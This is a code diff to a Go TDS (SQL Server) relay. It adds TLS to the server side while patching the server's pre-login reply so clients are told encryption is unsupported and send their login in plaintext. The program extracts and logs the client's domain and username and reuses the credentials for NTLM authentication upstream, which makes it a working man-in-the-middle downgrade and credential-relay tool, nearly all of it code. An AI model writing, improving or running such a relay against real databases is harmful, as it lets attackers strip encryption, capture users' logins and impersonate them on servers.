@@ -1,6 +1,7 @@
 package main
 
 import (
+	"crypto/tls"
 	"encoding/binary"
 	"encoding/hex"
 	"flag"
@@ -67,12 +68,12 @@ func handleConnection(clientConn net.Conn) {
 	defer clientConn.Close()
 
 	log.Printf("Dialing remote %s...", *remoteAddr)
-	remoteConn, err := net.DialTimeout("tcp", *remoteAddr, 10*time.Second)
+	rawRemote, err := net.DialTimeout("tcp", *remoteAddr, 10*time.Second)
 	if err != nil {
 		log.Printf("Failed to connect to remote %s: %v", *remoteAddr, err)
 		return
 	}
-	defer remoteConn.Close()
+	defer rawRemote.Close()
 
 	if *verbose {
 		log.Printf("Connected to remote server %s", *remoteAddr)
@@ -89,17 +90,14 @@ func handleConnection(clientConn net.Conn) {
 		log.Printf("Received client pre-login (%d bytes)", len(clientPreLogin))
 	}
 
-	// Disable encryption in client's pre-login before forwarding to server
-	disableEncryption(clientPreLogin)
-
-	// Forward pre-login to server
-	if _, err := remoteConn.Write(clientPreLogin); err != nil {
+	// Forward client pre-login to server UNMODIFIED (server needs to see encryption support)
+	if _, err := rawRemote.Write(clientPreLogin); err != nil {
 		log.Printf("Failed to send pre-login to server: %v", err)
 		return
 	}
 
 	// Read server's pre-login response
-	serverPreLogin, err := readTDSPacket(remoteConn, "server-prelogin")
+	serverPreLogin, err := readTDSPacket(rawRemote, "server-prelogin")
 	if err != nil {
 		log.Printf("Failed to read server pre-login: %v", err)
 		return
@@ -109,16 +107,36 @@ func handleConnection(clientConn net.Conn) {
 		log.Printf("Received server pre-login response (%d bytes)", len(serverPreLogin))
 	}
 
-	// Disable encryption in server's response before forwarding to client
-	disableEncryption(serverPreLogin)
+	// Check server's encryption preference and establish TLS if needed
+	serverEncrypt := getEncryptionByte(serverPreLogin)
+	var serverConn net.Conn = rawRemote
 
-	// Forward to client
+	if serverEncrypt != 0x02 { // Anything other than ENCRYPT_NOT_SUP
+		if *verbose {
+			log.Printf("Server encryption=0x%02x, performing TLS handshake", serverEncrypt)
+		}
+
+		hsConn := &tdsHandshakeConn{conn: rawRemote}
+		tlsConn := tls.Client(hsConn, &tls.Config{
+			InsecureSkipVerify: true,
+		})
+		if err := tlsConn.Handshake(); err != nil {
+			log.Printf("TLS handshake with server failed: %v", err)
+			return
+		}
+		hsConn.passthrough = true
+		serverConn = tlsConn
+		log.Printf("TLS established with server")
+	}
+
+	// Tell client encryption is not supported so it stays plaintext with us
+	disableEncryption(serverPreLogin)
 	if _, err := clientConn.Write(serverPreLogin); err != nil {
 		log.Printf("Failed to send pre-login to client: %v", err)
 		return
 	}
 
-	// Phase 2: Read client's login packet to extract credentials
+	// Phase 2: Read client's login packet to extract credentials (plaintext)
 	loginPacket, err := readTDSPacket(clientConn, "client-login")
 	if err != nil {
 		log.Printf("Failed to read client login: %v", err)
@@ -133,8 +151,8 @@ func handleConnection(clientConn net.Conn) {
 
 	log.Printf("Received credentials: %s\\%s", credentials.Domain, credentials.Username)
 
-	// Phase 3: Perform NTLM authentication with remote server
-	if err := performNTLMAuth(remoteConn, credentials); err != nil {
+	// Phase 3: Perform NTLM authentication with remote server (over TLS if applicable)
+	if err := performNTLMAuth(serverConn, credentials); err != nil {
 		log.Printf("NTLM authentication failed: %v", err)
 		return
 	}
@@ -147,10 +165,10 @@ func handleConnection(clientConn net.Conn) {
 		return
 	}
 
-	// Phase 5: Relay all subsequent traffic
+	// Phase 5: Relay all subsequent traffic (plaintext client <-> TLS server)
 	log.Printf("Starting bidirectional relay")
-	go relay(remoteConn, clientConn, "server->client")
-	relay(clientConn, remoteConn, "client->server")
+	go relay(serverConn, clientConn, "server->client")
+	relay(clientConn, serverConn, "client->server")
 }
 
 type Credentials struct {
@@ -238,6 +256,100 @@ func decodeUTF16LE(data []byte) string {
 	}
 	return strings.ReplaceAll(string(utf16.Decode(result)), "\x00", "")
 }
+
+// getEncryptionByte reads the ENCRYPTION option value from a PRELOGIN packet.
+func getEncryptionByte(packet []byte) byte {
+	if len(packet) < 8 {
+		return 0x02
+	}
+	data := packet[8:]
+	pos := 0
+	for pos < len(data) {
+		optType := data[pos]
+		if optType == 0xFF {
+			break
+		}
+		if pos+5 > len(data) {
+			break
+		}
+		offset := int(binary.BigEndian.Uint16(data[pos+1 : pos+3]))
+		if optType == 0x01 && offset < len(data) {
+			return data[offset]
+		}
+		pos += 5
+	}
+	return 0x02
+}
+
+// tdsHandshakeConn wraps a net.Conn to add/strip TDS headers around TLS records
+// during the TLS handshake phase. TDS embeds TLS within PRELOGIN (0x12) packets
+// for the handshake; after completion, set passthrough=true for direct access.
+type tdsHandshakeConn struct {
+	conn        net.Conn
+	readBuf     []byte
+	passthrough bool
+}
+
+func (c *tdsHandshakeConn) Read(b []byte) (int, error) {
+	// Drain buffered data first (from previous partial TDS payload read)
+	if len(c.readBuf) > 0 {
+		n := copy(b, c.readBuf)
+		c.readBuf = c.readBuf[n:]
+		return n, nil
+	}
+
+	if c.passthrough {
+		return c.conn.Read(b)
+	}
+
+	// Read and strip TDS header
+	header := make([]byte, 8)
+	if _, err := io.ReadFull(c.conn, header); err != nil {
+		return 0, err
+	}
+
+	length := int(binary.BigEndian.Uint16(header[2:4]))
+	if length < 8 {
+		return 0, fmt.Errorf("tdsHandshakeConn: invalid TDS length %d", length)
+	}
+
+	payload := make([]byte, length-8)
+	if _, err := io.ReadFull(c.conn, payload); err != nil {
+		return 0, err
+	}
+
+	n := copy(b, payload)
+	if n < len(payload) {
+		c.readBuf = payload[n:]
+	}
+	return n, nil
+}
+
+func (c *tdsHandshakeConn) Write(b []byte) (int, error) {
+	if c.passthrough {
+		return c.conn.Write(b)
+	}
+
+	// Wrap in TDS PRELOGIN packet
+	packet := make([]byte, 8+len(b))
+	packet[0] = 0x12 // PRELOGIN
+	packet[1] = 0x01 // EOM
+	binary.BigEndian.PutUint16(packet[2:4], uint16(8+len(b)))
+	copy(packet[8:], b)
+
+	_, err := c.conn.Write(packet)
+	if err != nil {
+		return 0, err
+	}
+	return len(b), nil
+}
+
+func (c *tdsHandshakeConn) Close() error                       { return c.conn.Close() }
+func (c *tdsHandshakeConn) LocalAddr() net.Addr                { return c.conn.LocalAddr() }
+func (c *tdsHandshakeConn) RemoteAddr() net.Addr               { return c.conn.RemoteAddr() }
+func (c *tdsHandshakeConn) SetDeadline(t time.Time) error      { return c.conn.SetDeadline(t) }
+func (c *tdsHandshakeConn) SetReadDeadline(t time.Time) error  { return c.conn.SetReadDeadline(t) }
+func (c *tdsHandshakeConn) SetWriteDeadline(t time.Time) error { return c.conn.SetWriteDeadline(t) }
 
 // disableEncryption patches the ENCRYPTION option in a TDS PRELOGIN packet
 // to ENCRYPT_NOT_SUP (0x02), preventing TLS negotiation that the relay can't handle.
